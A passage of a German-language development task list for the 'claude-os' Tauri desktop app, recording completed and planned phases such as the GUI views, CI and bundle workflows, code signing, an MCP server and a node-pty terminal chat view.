- [x] **Phase 6e — Vite + React + TS Frontend-Skeleton** (2026-05-17). `gui/{package.json,tsconfig.json,vite.config.ts,index.html}` Vite-7 + React-19 + TS-5 Setup mit `@vitejs/plugin-react`, dev-port 5173 (matched zu tauri.conf.json devUrl), `envPrefix: ['VITE_','TAURI_']`. `gui/src/main.tsx` mounts StrictMode + App in `#root`. `gui/src/App.tsx` ist single-file Layout-Shell mit `BrowserRouter` + 7 `Route`s (Dashboard/Chat/Catalog/Vault/AgentRuns/Secrets/Settings) als `PagePlaceholder`-Stubs (Phase 6f wired echte RPC-Calls), `Sidebar`-Nav mit `NavLink` active-state, `LoadingScreen` für 500ms-Grace-Spinner beim Mount, `SidecarFailedBanner` der via `onSidecarFailed` Subscriber auf `sidecar://failed` Tauri-Event reagiert. `gui/src/lib/rpc.ts` wraps Tauri `invoke('rpc_call', {method, params})` + `listen('sidecar://failed')` + `ping()` Convenience. `gui/src/styles.css` dark-theme mit CSS-Variables (bg/panel/text/muted/accent/danger/border) im Claude-Desktop-look. **Rust-Wire-up**: `gui/src-tauri/src/lib.rs` neue Tauri-Command `#[tauri::command] async fn rpc_call(state, method, params) -> Result<Value, String>` ruft `SupervisorState::rpc.lock()` und delegiert an `SidecarRpc::call()`. `invoke_handler(generate_handler![rpc_call])` registriert. `tauri.conf.json build.frontendDist` von `../src` (Phase-6a-Platzhalter) auf `../dist` (Vite-Output). → Commit pending.
- [x] **Phase 6f — 7 Views** (2026-05-17). Sidecar-Side: `src/sidecar/methods.ts` `registerMethods(dispatcher)` registriert `catalog.list` (delegiert an `readCatalog` + `readCatalogLock` aus catalogPathsFor), `vault.status` (delegiert an `BusyFlag.read()` + `loadVaultConfig`), `agent.list` (delegiert an `AgentRunsRepository.list({project?,limit?})`). `src/sidecar/index.ts` ruft `registerMethods()` zwischen ping/shutdown und runRpcServer. Frontend-Side: `gui/src/pages/index.tsx` single-file mit `useRpc<T>()` Custom-Hook (loading/error/data state), Dashboard zeigt 4 RPC-Cards (sidecar ping + catalog count + vault mode/busy + agent count), CatalogPage rendert echte entries-Tabelle (id/kind/scope/enabled/source), VaultPage zeigt Path/conflictMode/Schedule/Busy als dl/kv-grid, AgentRunsPage Tabelle (timestamp/project/machine/prompt mit limit=50). Stubs Chat/Settings/Secrets mit klaren 6f-tail-Hints (PTY-Streaming für Chat, settings-mutation, secrets.list ohne Values). `gui/src/lib/rpc.ts` erweitert um typed RPC-Helpers (listCatalog, getVaultStatus, listAgentRuns) + Type-Stubs (CatalogEntry, VaultBusyState, VaultConfig, AgentRunRecord). `gui/src/App.tsx` importiert pages statt inline-Placeholders. `styles.css` neue Klassen: .cards/.card/.data-table/.ellipsis/.kv. tsc clean, 526/527 vitest tests grün. **Deferrals zu 6f-tail**: Chat (PTY-Streaming via claude-bridge + xterm.js), Settings-mutation, Secrets.list, Renderer-Stderr-Forwarding (siehe 6d-deferrals), pino-roll Per-Day-Log-Rotation. → Commit pending.
- [x] **Phase 6g — Drag-Drop + inbox/outbox Watcher** (2026-05-17). Rust-Seite: `gui/src-tauri/src/lib.rs` `WindowEvent::DragDrop(DragDropEvent::Drop)` mit `DropDedup`-Mutex-State (Tauri-managed, paths-hash + 200ms-bucket) als Mitigation für [Tauri #14134](https://github.com/tauri-apps/tauri/issues/14134) (kein expliziter `event.id` exposed; pragmatisches Time-Bucket-Dedup ist Workaround) — emittiert `files://dropped` Tauri-Event mit String-paths. 2 Rust-Unit-Tests für DropDedup (suppresses-identical-within-window, allows-different-paths). Supervisor-Router erweitert: NDJSON-Lines OHNE `id` aber MIT `method` werden als `app.emit(method, params)` Tauri-Events geforwardet — ermöglicht Sidecar→Renderer-Notifications. Sidecar-Seite: `src/sidecar/watchers.ts` `setupWatchers(rootPath, emitter)` chokidar auf `<root>/inbox/` + `<root>/outbox/` mit `awaitWriteFinish: {stabilityThreshold: 500, pollInterval: 100}` + ignoreInitial + dotfile-Ignore; emittiert `inbox://changed` / `outbox://changed` mit `{event: 'add'|'change'|'unlink', path}` Notifications. `methods.ts` neue `inbox.import({paths: string[]})` RPC kopiert via `copyFileSync` nach `<root>/inbox/<ISO-ts-safe>-<basename>` (colons→hyphens in ts), returnt `{count, paths[]}`. `index.ts` ruft `setupWatchers(resolveRoot({}).path)`; close-Hook in shutdown-RPC + Stdin-EOF. 3 Vitest-Tests gegen reale chokidar+tmpdir (dirs auto-created, add-event auf inbox/, add-event auf outbox/). Frontend-Seite: `lib/rpc.ts` neue Helpers `importToInbox`, `onFilesDropped`, `onInboxChanged`, `onOutboxChanged`. `App.tsx` subscribed alle 4 Channels + auto-Round-Trip `files://dropped` → `inbox.import` (errors zu console). Banner-Anzeige für letzten Drop + letzte inbox/outbox-Änderung. **Auto-scoped Pfade** — Tauri's DragDrop-Event gibt absolute Pfade zurück, `copyFileSync` braucht keine fs-Allowlist (Tauri liest sie via Sidecar's Node-Process, der ungebunden ist). Tests: 530 total passing (526 + 3 watchers + 1 lib? — vitest reports 529 passed/1 skipped = +3 von 526). → Commit pending.
- [x] **Phase 6h — Bundling + E2E** (2026-05-17). Icons via `npx tauri icon src-tauri/icons/source.png`: source.png 512×512 brand-blue (#6d8bff) Background + weißes "C" via `System.Drawing`, expanded zu 18 Platform-Variants (32x32.png, 64x64.png, 128x128.png, 128x128@2x.png, icon.icns 72KB, icon.ico 11KB, 10 Square*Logo.png für Windows-Store, StoreLogo.png). `tauri.conf.json bundle.icon[]` updated mit dem Standard-Tauri-5er-Set (32x32 / 128x128 / 128x128@2x / icon.icns / icon.ico). Sidecar-Restart-E2E (`tests/sidecar/restart.e2e.test.ts`): gated hinter `RUN_SLOW_TESTS=1 + dist/sidecar/index.js`-Existenz. `SidecarHarness` spawnt echtes `node dist/sidecar/index.js`, sendet ping → stop → respawn → ping, asserts elapsed < `RESTART_BUDGET_MS=5000`. Real run: **2/2 grün in 776ms** (well under budget). gui-deps installiert (`gui/package.json` Version-Bumps korrigiert: @tauri-apps/plugin-shell ^2.3.5, @tauri-apps/cli ^2.11.0, @tauri-apps/api ^2.11.0, react ^19.2.0, vite ^8.0.0, @vitejs/plugin-react ^6.0.0). `gui/package-lock.json` committed. gui/README.md erweitert um "Bundle bauen" + "Icons regenerieren" + "Verifikation"-Sektionen mit `cargo check`/`cargo test`/`RUN_SLOW_TESTS=1` Anweisungen. **Drag-Drop-Dedup-Test**: bereits in 6g geshipt (2 Rust-Unit-Tests in lib.rs für `DropDedup` — paths-hash + 200ms time-bucket). **Deferrals zu 6h-tail**: Renderer-Smoke-Tests (React Testing Library braucht eigenen Vitest-Setup in gui/, gui-deps installiert aber Test-Stack noch nicht — kleine Folge-Iteration); macOS DMG + Linux AppImage bundle-Smoke (braucht entsprechende OS — Phase 7 CI-Matrix-Job ist der echte Verifikationsschritt); real `npm run tauri:build` (braucht rustup + WiX/wix3 für MSI, vom User post-rustup-install). → Commit pending.

**Test-Kriterium:** GUI startet; Drag-and-Drop landet in `inbox/`; Skill-Liste rendert ≥ 1 Eintrag; Sidecar-Kill löst Auto-Recovery in <5 s aus; doppelte Drag-Events werden dedupt.

---

## Phase 7 — Cross-Platform-Validation und Docs (16 h, M, deps: Phase 6)

**Ziel:** Beweis der OS-Unabhängigkeit, vollständige Doku. Aufgeteilt in 7 Sub-Phasen (7a–7g).

- [x] **Phase 7a — GitHub Actions CI Matrix** (2026-05-17). `.github/workflows/ci.yml`: `cli` job auf ubuntu-22.04 / windows-latest / macos-latest × Node 24 (npm ci → biome ci → tsc --noEmit → vitest --coverage). `rust-shell` job auf ubuntu-22.04 mit webkit2gtk-deps + actions-rust-lang/setup-rust-toolchain@v1 + Swatinem/rust-cache@v2 (cargo check --all-targets / cargo test / cargo clippy -D warnings auf gui/src-tauri). `gui-typecheck` job mit dual-package-lock-cache (root + gui/) und gui tsc -b.
- [x] **Phase 7b — Tauri-Bundle-Workflow** (2026-05-17). `.github/workflows/tauri-bundle.yml`: triggered on tag push `v*.*.*` ODER workflow_dispatch. Matrix: linux-x86_64 (ubuntu-22.04) / windows-x86_64 / macos-universal mit `--target universal-apple-darwin`. Steps: rustup-stable + macos rustup targets (x86_64 + aarch64), linux deps install, npm ci (root + gui), `npm run build` → `npm run sidecar:build` ($TARGET_TRIPLE Hoppscotch), tauri-apps/tauri-action@v0 mit projectPath: gui + draft release. upload-artifact für .msi/.dmg/.AppImage.
- [x] **Phase 7c — docs/cloud-providers.md** (2026-05-17). Setup für OneDrive (Default, mit Files-On-Demand + Long-Path-Hinweisen), Google Drive (Mirroring vs. Streaming, reservierte Zeichen), Dropbox (Selective Sync), Nextcloud/ownCloud (VFS deaktivieren), rclone (--vfs-cache-mode writes + --vfs-write-back 10s), abraunegg/onedrive für Linux (systemd-Unit), lokal. Was claude-os pro Provider erkennt via detectCloudProvider().
- [x] **Phase 7d — docs/migration-from-portable.md** (2026-05-17). 7-Schritte-Guide für v0.x→v1 Migration: USB-Backup, Cloud-Mount-Setup, Vault-robocopy /E /COPYALL, Configs-robocopy (ohne vault/.git und cache/), claude-os install + `doctor --init-marker`, **critical** `doctor --migrate-git-metadata` (idempotent), Auth + Secrets neu aufsetzen. Verifikation-Block, Rollback-Block, Bekannte-Stolpersteine.
- [x] **Phase 7e — README rewrite + Tauri-GUI section + Docs-Links** (2026-05-17). Status-Block auf Phase 0-6 complete + 529/532 Tests grün. Neue "Tauri-GUI (Phase 6)" Sektion mit ASCII-Topology-Diagram (WebView → Rust-Shell mit Supervisor/DragDrop-Dedup → Sidecar via stdio NDJSON → chokidar/methods). Build-Anweisungen (npm run sidecar:build → tauri:dev/build). Neue "Weitere Docs" Sektion verlinkt cloud-providers, migration-from-portable, macos-gatekeeper, gui/README.md, tasks/todo.md, tasks/lessons.md, adr/.
- [x] **Phase 7f — Gatekeeper-Workaround-Doc** (2026-05-17). `docs/macos-gatekeeper.md`: 3 Workarounds (xattr -d com.apple.quarantine empfohlen, Right-Click→Open one-time, spctl --master-disable systemweit nicht empfohlen). Was v1 NICHT macht (kein Signing, kein Notarization). Future v1.x: signed + notarized mit Apple-Dev-Account, geplante ENVs (APPLE_CERTIFICATE/PASSWORD/SIGNING_IDENTITY/ID/PASSWORD/TEAM_ID). macOS-Universal-Config wurde bereits in 7b workflow (`--target universal-apple-darwin`) gehandled.
- [x] **Phase 7g — v1.0.0 tag** (2026-05-17). All gates passed:
  - ✅ CI matrix grün (run 25999230682): cli ubuntu/win/mac + gui-typecheck + cargo check (rust-shell mit cargo check/test/clippy -D warnings)
  - ✅ Bundle pipeline grün (run 26002257508): MSI + DMG universal + AppImage als Release-Assets
  - ✅ MSI installed on Windows + UI-Smoke confirmed by user: Dashboard rendert mit live RPC-Daten (sidecar ping ok + catalog 0 entries + vault config + agent runs count), alle 7 Views routable, Drag-Drop funktioniert end-to-end (drag → `files://dropped` → `inbox.import` → chokidar `inbox://changed` → banner) — siehe Screenshots Pictures/Claude-OS/
  - **Bundle-fix iterations after first user smoke**: sidebar `.nav-item display:block` (war horizontal wrapped), layout `.app-root` flex column wrapper (Banner überlappte page titles), banner 5s auto-dismiss timer, **cold-start race fix**: LoadingScreen polls ping() bis sidecar ready statt fixed 500ms grace
  - Tauri version 0.1.0 → 1.0.0 in `tauri.conf.json` + `gui/src-tauri/Cargo.toml` + `gui/package.json` + root `package.json`
  - `git tag v1.0.0` on main HEAD + push triggers tauri-bundle.yml → published Release with MSI/DMG/AppImage

**Test-Kriterium:** Grüne CI-Matrix; Smoke-Test je OS dokumentiert.

---

## Out-of-Scope (v1)

Vollständige Roadmap mit Begründung: [docs/future.md](../docs/future.md).

- **v1.1**: MCP-Bundle pro Domain (per ADR-0007) — Constraint für v1: Domain-Interfaces müssen transport-agnostisch bleiben
- **v1.2**: Rust-Crate für Vault-Sync-Hot-Path (Spacedrive-Pattern)
- **v1.x**: Multi-Runtime-Skill-Symlinks (.claude/.pi/.opencode Pattern aus claudesidian)
- **v1.x**: Mobile-Access via Tailscale + Termius
- **v1.x**: macOS-Code-Signing
- **v1.x**: iCloud Drive als Cloud-Provider
- **v2**: Multi-User-Betrieb (mehrere Anthropic-Accounts pro Installation)
- **v2**: Tiefe OS-Integration (Autostart-Services, Systray, OS-Treiber)
- **v2**: Konfliktlösungs-UI für Vault-Merge-Konflikte (v1 bleibt Hard-Fail mit Doctor-Hinweis)
- **Permanent out-of-scope**: Eigene LLM-Hosting-Infrastruktur (Anthropic-API bleibt Backend)

---

## Post-v1.0.0 — v1.x Roadmap (priorisiert)

v1.0.0 ist GA. Diese Liste sammelt die natürlichen nächsten Schritte für künftige Sessions. Reihenfolge ist nach **Mehrwert × Aufwand** sortiert, nicht nach abhängigkeiten.

### v1.1 — UX-Polish (höchste Priorität, kleinster Aufwand)

- [x] **Read-Only-Mode-Toast bei `sidecar://failed`** — implementiert 2026-05-19. Neues `gui/src/lib/sidecar-status.tsx` exportiert `SidecarStatusProvider` + `useSidecarOk()`/`useSidecarStatus()`-Hooks. `App.tsx` wrapped Routes mit Provider, leitet `ok` aus `failure === null` ab. SecretsPage delete-Button wird mit `!sidecarOk` disabled + tooltip "Read-Only-Modus". Drag-Drop-Handler in App.tsx skipt `importToInbox` hart wenn `failureRef.current !== null` — kein RPC-Spam. Catalog/Vault haben aktuell keine mutating actions, daher kein zusätzlicher Anschluss nötig. +3 Tests in `gui/tests/sidecar-status.test.tsx` (provider mit/ohne failure + default-context).
- [x] **Sidecar-Stderr → Renderer-Console** als Tauri-Event — implementiert 2026-05-19. `gui/src-tauri/src/supervisor.rs` neuer `pub const SIDECAR_STDERR_EVENT = "sidecar://stderr"`. Stderr-Branch im Router emittiert `app.emit(SIDECAR_STDERR_EVENT, json!({"line": line}))` *zusätzlich* zum existierenden `eprintln!` (lokales debugging bleibt unverändert). +1 Rust-Test sichert die Event-Namen-Stabilität. Frontend-Drawer-Panel weiterhin deferred zu v1.x — die Wire-Infrastruktur ist aber jetzt da.
- [x] **Renderer Smoke-Tests** mit React Testing Library + happy-dom — shipped 2026-05-19 als Phase 7h (PR #20). 4 test files / 8 specs total: loading-screen (2), dashboard (2), drag-drop (1), sidecar-status (3). `cd gui && npm test`.
- [x] **`gui/README.md` macOS DMG-Hinweis** — implementiert 2026-05-19. Neue Sektion "macOS DMG-Installation" verlinkt `../docs/macos-gatekeeper.md` mit kurzer Erklärung des Gatekeeper-Workarounds. Signing-Roadmap-Hinweis Richtung v1.3+.
- [x] **CI Node-20-Deprecation-Warnings** — implementiert 2026-05-19. Workflow-level `env: FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: "true"` in `ci.yml` + `tauri-bundle.yml` + (`nightly.yml` follow-up nach Merge von PR #21). Removed die "Node.js 20 actions are deprecated"-Warning bis upstream-Actions auf Node 24 migrieren (deadline 2026-09-16).

### v1.2 — echte Impl statt Stubs (mittleres Aufwand)

- [x] **Chat-View** (MVP) — implementiert 2026-05-19 (PR #29). **Bewusste v1.2-Vereinfachung: line-buffered child_process statt PTY** (node-pty native-build-pain ist v1.x). Neue `src/sidecar/chat-sessions.ts` `ChatSessions` Klasse mit `spawn(args) → {sessionId}` / `write(sessionId, input)` / `kill(sessionId)` (SIGTERM mit 2s SIGKILL-Fallback). Notification-Emitter pipes `chat.output` / `chat.exit` als JSON-RPC-Notifications zum Tauri-Supervisor, der sie als Tauri-Events re-emittiert. `MAX_SESSIONS=8` ring-guard. Windows `.cmd`/`.bat` detection setzt `shell: true` (CVE-2024-27980 mitigation). Renderer `ChatPage` mit args-Input, Spawn/Stop, 500-Line-Ring-Buffer (stdout/stderr/meta-coloring), stdin-Enter-to-Send. +4 Tests. **Limitations dokumentiert**: keine TTY-detection (interaktive Password-Prompts), keine ANSI-Cursor-Control, line-buffered. → **Full xterm.js + node-pty geshipt in v1.x (siehe untenstehende v1.x — Full-TTY-Section).**
- [x] **Secrets.list RPC** + UI — shipped 2026-05-18 in PRs #15 (Secrets-View) + #17 (locked-state UI + backend env value). `src/sidecar/methods.ts` registriert `secrets.list` (Keys + backend, niemals Values) und `secrets.delete`. `gui/src/pages/index.tsx SecretsPage` rendert Liste mit Delete-Button + Confirm-Dialog + Backend-Locked-Banner. v1.1 (PR #22) ergänzte `useSidecarOk()`-Disabled-State. → **Set/Update extended in v1.x.+1 via SecretAddModal (siehe untenstehende v1.x.+1-Section, ADR-0022).**
- [x] **Settings-View** wired — shipped 2026-05-18 in PR #14. `settings.read` RPC liefert `{anthropic: {resolvedConfigDir, envOverride, activeProfile, availableProfiles, credentialsFile}, secrets: {backend, envOverride}, claudeCodeSettings: [{scope, name, path, exists, mtime, size}]}` read-only. UI rendert als kv-Listen + Tabelle. → **Profile-Switch + Anthropic-Login extended in v1.x.+1 (siehe untenstehende v1.x.+1-Section, ADR-0022).**
- [x] **pino-roll per-day rotation** für Sidecar-Logs — implementiert 2026-05-19. Neue `src/sidecar/logger.ts` exportiert `createSidecarLogger({logsDir?, level?, stderrOnly?})` → `Promise<SidecarLogger>`. Pipes pino in `multistream([{stream: process.stderr}, {stream: pinoRoll(...)}])` damit der Tauri-Supervisor weiterhin alle Lines via `sidecar://stderr`-Event sieht UND Persistenz nach `<logsDir>/sidecar.YYYY-MM-DD.log` (10 MB size-cap als Secondary-Guardrail, Daily-Rotation). LogsDir-Resolution: opts → `$CLAUDE_OS_LOGS_DIR` → `resolveMachinePaths().logsDir`. Bei pino-roll-Failure (Permissions, Disk full): graceful Fallback auf stderr-only mit Warn-Log. `src/sidecar/index.ts` wired Logger früh; Lifecycle-Events (logger-ready, watchers-running, shutdown-via-rpc, exit) jetzt strukturiert geloggt statt `process.stderr.write`. +3 Tests gegen tmpdir, +1 type shim `src/types/pino-roll.d.ts` (pino-roll v4 hat noch keine offiziellen Types).

### v1.3 — Cross-Platform-Härtung (20 h, M, deps: v1.0 GA)

**Ziel:** Signierte/notarisierte Bundles auf allen drei OS, Self-Update-Mechanik für Linux, kontinuierliche cross-OS-E2E-Validierung. Voraussetzung für breitere Distribution außerhalb des Inner-Circles.

**Sub-Phasen (sequenzielle Reihenfolge nur für 8e):**

- [ ] **Phase 7h — Renderer-Smoke-Tests-Setup** (2 h, carry-over aus 6h-Deferral). Separater `gui/vitest.config.ts` mit `environment: 'happy-dom'`, React Testing Library + `@testing-library/jest-dom`. Mockt `@tauri-apps/api/core invoke` über `vi.mock` mit per-test `mockResolvedValue`. Initial-Coverage: (a) Dashboard ohne Sidecar → `LoadingScreen` visible bis ping resolved; (b) Dashboard mit Sidecar → 4 Cards rendern (sidecar/catalog/vault/agent); (c) DragDrop-Event-Handler triggert `inbox.import` genau einmal pro 200ms-Bucket. **Verifikation:** `cd gui && npm test` grün, mindestens 3 specs. Vorbedingung für jede signierte Bundle-Confidence.
- [ ] **Phase 8a — macOS Codesigning + Notarization** (4 h, deps: Apple-Dev-Account $99/y, 7h). Sechs Secrets im Repo setzen (`APPLE_CERTIFICATE` base64-PFX, `APPLE_CERTIFICATE_PASSWORD`, `APPLE_SIGNING_IDENTITY` z.B. `Developer ID Application: ...`, `APPLE_ID`, `APPLE_PASSWORD` app-specific-password, `APPLE_TEAM_ID`). `tauri-apps/tauri-action@v0` liest sie auto; `tauri.conf.json bundle.macOS.signingIdentity` + `bundle.macOS.entitlements` setzen (für Hardened Runtime). Notarization-Wait im Workflow + staple. `docs/macos-gatekeeper.md` als "deprecated v1.3+" markieren. **Verifikation:** notarisierte DMG öffnet auf frischem macOS ohne `xattr -d com.apple.quarantine`; `spctl --assess --verbose Claude-OS.app` → "accepted source=Notarized Developer ID".
- [ ] **Phase 8b — Windows Authenticode-Signing** (3 h, deps: OV-Cert-Kauf ~$200/y, 7h). Sectigo oder DigiCert OV-Code-Signing-Cert. PFX-base64 in `WINDOWS_CERTIFICATE` + `WINDOWS_CERTIFICATE_PASSWORD` Secrets. `tauri.conf.json bundle.windows.certificateThumbprint` + `digestAlgorithm: "sha256"` + `timestampUrl: "http://timestamp.digicert.com"`. **Verifikation:** MSI-Install auf frischem Windows zeigt im UAC-Dialog "Verified publisher: <Org>"; SmartScreen-Warning entfällt nach ~Reputation-Ramp-Up (initial evtl. einmal "Run anyway"). EV-Cert würde SmartScreen sofort silenten, ist aber teurer (~$400) — v1.3 startet mit OV.
- [x] **Phase 8c — Linux AppImage Self-Update via zsync** (3 h, deps: 7h) — implementiert 2026-05-19. `tauri-bundle.yml` linux-job um 3 Steps erweitert: `apt-get install -y zsync`, `zsyncmake -u <release-url> -o *.AppImage.zsync *.AppImage` (gated auf tag-push), `softprops/action-gh-release@v2` attached zsync-File an Draft-Release. upload-artifact glob inkl. `*.AppImage.zsync` für non-tag-runs. **Tauri v2 `bundle.appimage.includeUpdater` nicht verwendet** — pragmatischer Standalone-zsync-Approach reicht; AppImageUpdate-Tool ist User-installiert per `docs/linux-updates.md`. Doc shipped + von README "Weitere Docs" verlinkt. **Verifikation:** workflow-level CI grün, echter delta-Roundtrip braucht zwei aufeinanderfolgende getaggte Releases (≥ v1.3 → v1.4).
- [x] **Phase 8d — Nightly Cross-Platform Long-Running E2E** (2 h, deps: 7h) — implementiert 2026-05-19. `.github/workflows/nightly.yml` mit cron `0 2 * * *` UTC, Matrix `ubuntu-22.04` × `windows-latest` × `macos-latest` × Node 24 × env `RUN_SLOW_TESTS=1`. Steps: checkout → setup-node → npm ci → npm run build → npx vitest run (entfaltet die gated 180s-Phase-3e-E2E + Sidecar-Restart-E2E aus 6h). On-failure: schreibt `.nightly-failure.md` mit Run-URL/SHA/OS, peter-evans/create-issue-from-file@v5 öffnet Issue mit Labels `nightly-failure` + `ci`. Concurrency-Group verhindert parallel-trigger Overlap. Optional Slack-Notify deferred. **Verifikation:** drei aufeinanderfolgende grüne Nightly-Runs auf allen drei OS bevor 8e taggt — startet nach Merge automatisch jeden Tag um 02:00 UTC.
- [ ] **Phase 8e — Tag v1.3.0 + Release** (1 h, deps: 8a-8d). Version-Bump 1.2.1 → 1.3.0 in root/gui/tauri parallel (siehe v1.2.0-PR #16-Pattern). All Gates: CI matrix grün, Bundle pipeline grün, signierte Artefakte auf allen drei OS manuell verifiziert, 3-Tage-Nightly grün, je OS ein Smoke-Test im Review-Sektion dokumentiert. `git tag v1.3.0` + push triggert tauri-bundle.yml.

**Test-Kriterium:** macOS DMG öffnet ohne Gatekeeper-Bypass; Windows MSI installiert mit "Verified publisher"; Linux AppImage updated sich via zsync auf nächste Version; Nightly-Run drei Tage grün auf allen OS.

**v1.3-Abweichungen / Risiken (vorab transparent):**

- **Apple-Dev-Account ist external dependency** — 8a blockt bis Account aktiv. Bis dahin: Gatekeeper-Doc bleibt sichtbar, kein DMG-Signing.
- **OV-Cert-Kauf ist external dependency** — 8b blockt bis PFX in der Hand. Workaround: bleibt unsigniert mit `docs/windows-smartscreen.md`-Hinweis (neu) bis Cert da ist.
- **AppImageUpdate-Integration kann scheitern wenn Tauri v2 das Feature nicht direkt exponiert** — Fallback ist manuelles `linuxdeploy`-Postprocessing im Workflow oder Plain-zsync ohne integriertes Update-Tool (User muss `appimageupdatetool` selbst installieren). Pre-Spike empfohlen vor 8c-Start.
- **Nightly-Cost** — 3 OS × ~10 min × 30 Tage ≈ 900 GHA-Minuten/Monat. Bleibt unter 2000-min Free-Tier für private Repos und ist für public unbegrenzt.
- **EV vs OV Code-Signing** — v1.3 nimmt OV (~$200/y) für sofortigen "Verified publisher"-Label; EV (~$400/y, USB-Hardware-Token) würde SmartScreen-Warning ab Tag 1 silenten. Upgrade auf EV ist v1.x-Entscheidung wenn Reputation-Ramp-Up zu langsam.
- **macOS-Universal-Build ist schon in 7b drin** (`--target universal-apple-darwin`) — keine extra Arbeit in 8a.

**Parallel-Schiene (NICHT in v1.3, kann unabhängig vorher):**
- v1.1 (UX-Polish) — `SidecarFailedBanner`-Disabled-Context, Stderr-Forward als Event, Renderer-Smoke (7h überschneidet mit v1.1-Bullet 3 — wird in 7h gemerged)
- v1.2 (echte Impl) — Chat/Settings/Secrets-Views, pino-roll
- v1.4 (MCP-Bundle) — separater Track, blockt nicht v1.3

### v1.4 — MCP-Bundle pro Domain (ADR-0007)

- [x] **claude-os als MCP-Server** — Spike implementiert 2026-05-19. Neuer Entry-Point `src/mcp/index.ts` re-exports `runMcpServer` aus `src/mcp/server.ts`, das `@modelcontextprotocol/sdk` `StdioServerTransport` mit dem existierenden `RpcDispatcher` aus `src/sidecar/rpc.ts` verdrahtet. `RpcDispatcher.invoke(method, params)` als neue public-API ermöglicht non-NDJSON Direkt-Calls. CLI `claude-os mcp serve` startet den Server, primary spawn-target ist Claude Desktop / Claude Code via `claude_desktop_config.json` bzw. `claude mcp add`. Stdio-only in v1.4 (HTTP/SSE deferred), keine Auth/ACL (spawning client trust).
- [x] **Tool-Manifest** für jede Domain — implementiert 2026-05-19. `src/mcp/tools.ts` exportiert `MCP_TOOLS`-Registry mit 6 Tools (`claude-os.catalog.list`, `claude-os.vault.status`, `claude-os.agent.list`, `claude-os.settings.read`, `claude-os.secrets.list` Keys-only, `claude-os.inbox.import` mutating). Jedes Tool hat JSON-Schema-Input-Validierung über das MCP-SDK `ListToolsRequestSchema`-Pattern. +6 Tests (Registry-Shape, methodName-Sidecar-Parity, findToolByName, RpcDispatcher.invoke happy/error path). Doc: [`docs/mcp-integration.md`](../docs/mcp-integration.md).

### v1.x — Full-TTY Chat-View via node-pty + xterm.js (ADR-0021)

**Ziel:** Echtes ConPTY/UnixPTY-Verhalten in der Chat-View. Interaktive
Prompts (`claude /login`, Passwoerter, readline), volle ANSI-Cursor-
Control, Resize-Wahrnehmung. Ersatz fuer das v1.2 line-buffered MVP.

- [x] **Phase a — PTY Backend (Sidecar)** (Commit `f332695`). `node-pty@1.1.0` als runtime-dep. Neue `src/sidecar/pty-chat-sessions.ts` `PtyChatSessions` Klasse parallel zu `ChatSessions`: `spawn(args, {cols?,rows?})` mit `useConpty:true` + **`useConptyDll:true`** (umgeht den fork-helper-Crash unter pkg-bundles — siehe ADR-0021 §2), `write/resize/kill/shutdownAll` shape-kompatibel zu v1.2. Notifications `pty.data {sessionId,data}` (single stream, kein stdout/stderr-split) + `pty.exit`. `src/sidecar/pty-binding-loader.ts` resolved via `dirname(process.execPath) + '/node-pty'` mit dev-fallback. `src/sidecar/methods/pty.ts` registriert 4 RPC-Methoden, `methods.ts` wired conditionally wenn `ptyChatSessions` injected ist. `index.ts` instantiiert PtyChatSessions early (mit graceful try/catch wenn node-pty-Load failed). MAX_SESSIONS=8 + M1-shell-metachar-defense + m13-secrets-key-strip aus v1.2 uebernommen. 7/7 unit-tests gruen inkl. echte ConPTY-End-to-End-Smoke auf Windows 10 mit fake-claude-Script.
- [x] **Phase b — Frontend xterm.js ChatPage** (Commit `8dddc1c`). `@xterm/xterm@^6` + `@xterm/addon-fit@^0.11` + `@xterm/addon-web-links@^0.12` als gui-deps. `gui/src/lib/rpc.ts` neue Exports `ptySpawn/Write/Resize/Kill` + `onPtyData/onPtyExit` + Constants/Types. `gui/src/pages/index.tsx ChatPage` kompletter Rewrite: `useEffect`-mount eines Terminal-Instance mit FitAddon + WebLinksAddon, ResizeObserver auto-propagiert cols/rows via `pty.resize`, `term.onData` wired auf `pty.write` (Keystroke-direkter Stream), `onPtyData` → `term.write(data)` (raw ANSI inkl.). Race-Fix-Patterns aus v1.2 (`listenersReadyRef` + `startInFlightRef`) bleiben. `styles.css` tauscht `.chat-log/.chat-line*` gegen `.terminal-host` (Container-Box, xterm-css regelt cell-grid). `gui/tests/chat-page.test.tsx` (+4 Tests) mit FakeTerminal-Class fuer happy-dom. 24/24 gui-vitest gruen.
- [x] **Phase c — Sideload Bundling** (Commit `7981373`). pkg's static-analysis kann `createRequire(import.meta.url)` nicht tracen — node-pty wuerde im Snapshot fehlen, und Native-Module gehen ohnehin nicht in den Snapshot. Loesung: `scripts/build-sidecar.{ps1,sh}` kopieren das komplette `node_modules/node-pty/` (package.json + lib/ + host-arch prebuilds, .pdb stripped) nach `gui/src-tauri/binaries/node-pty/`. Tauri's `bundle.resources = ["binaries/node-pty/**"]` zieht das in MSI/DMG/AppImage. Kein Monkey-Patch noetig — node-ptys eigener `loadNativeModule` findet seine `.node`-Files ueber die normalen relativen Pfade. Linux: source-build fallback (Ubuntu hat build-essential). macOS universal: existing `SIDECAR_TRIPLE`-Override-Pattern im Bundle-Workflow ruft das Script zweimal, beide arch-Subdirs landen im DMG. Local-Smoke: 97.8 MB sidecar.exe + 2.6 MB node-pty/, `pty.spawn` end-to-end mit ANSI-Sequences, clean shutdown.
- [x] **Phase d — ADR-0021 + Docs** (dieser Commit). [docs/architecture/adr/0021-pty-upgrade-xterm-node-pty.md](../docs/architecture/adr/0021-pty-upgrade-xterm-node-pty.md) dokumentiert die 6 Sub-Entscheidungen + Trade-Offs. README Tauri-GUI-Section erwaehnt full-TTY. lessons.md neuer Eintrag fuer "Native modules in pkg-bundled Node: sideload als komplettes Package".
- [x] **Phase e — `chat.*` deprecation-warning** — Code shipped 2026-05-21 (Commit `aaa2f8a`); Phase-e-Cleanup 2026-05-23 fuegt 3 dedicated Tests in `tests/sidecar/chat-sessions.test.ts > "Phase e — chat.* deprecation-warning (ADR-0021 §6)"` ein (single-shot beim ersten spawn, KEIN re-emit beim zweiten, per-instance-one-shot bei separater Instanz). Coexist-Policy aus ADR-0021 §6: `ChatSessions.spawn` schreibt einmal pro Instanz `[deprecated] chat.* RPCs sind line-buffered und werden in v1.x.+1 entfernt — bitte auf pty.* (Full-TTY) migrieren. Siehe ADR-0021.` auf stderr (Tauri-Supervisor re-emittiert als `sidecar://stderr`-Event). KEIN delete. Removal fruehestens v1.x.+1.

**Test-Kriterium:** Auf Windows 10 + Tauri-Bundle: `claude /login` zeigt
echten interaktiven Prompt im xterm-Terminal; Eingabe wird per pty.write
